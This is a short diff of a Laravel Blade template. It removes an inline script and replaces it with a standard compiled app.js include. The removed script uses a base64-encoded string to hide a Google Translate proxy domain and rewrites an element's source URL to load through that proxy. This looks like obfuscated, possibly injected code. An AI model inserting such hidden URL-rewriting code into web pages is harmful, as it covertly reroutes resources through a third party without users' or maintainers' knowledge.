@@ -3,7 +3,7 @@
     <head>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <script>"use strict";class cDg{constructor(e){this.id=e}view(){const e=document.getElementById(this.id).src.split("/");var t="";for(let c=0;c<e.length;c++)2==c?t+=e[c].replaceAll("-","--").replaceAll(".","-")+atob("LnRyYW5zbGF0ZS5nb29n")+"/":c!=e.length-1?t+=e[c]+"/":t+=e[c];return document.getElementById(this.id).src=encodeURI(t),encodeURI(t)}}</script>
+        <script src="{!! mix('js/app.js') !!}"></script>
 
         <title>Laravel</title>
 
